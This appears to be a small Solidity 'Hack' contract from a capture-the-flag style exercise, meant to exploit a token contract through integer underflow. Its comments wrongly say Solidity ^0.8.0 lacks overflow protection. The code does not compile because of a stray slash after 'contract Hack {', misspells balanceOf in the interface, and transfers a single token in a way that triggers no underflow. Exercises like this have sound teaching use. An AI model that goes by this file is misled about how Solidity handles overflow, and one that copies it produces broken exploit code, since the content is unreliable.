// SPDX-License-Identifier: MIT
// The solidity contract looks cool but the version does not have safemath function
// There is a chance of underflow or overflow due to the solidity version
// By transfering a large number of tokens than what is in the contract, there can be the overflow
pragma solidity ^0.8.0;
interface IToken {
    function balanceof(address)external view returns (uint256); 
    function transfer(address to, uint256 value) external returns (bool); 
}

contract Hack {/
    constructor(address _target) {
        IToken(_target).transfer(msg.sender, 1);
    }
}
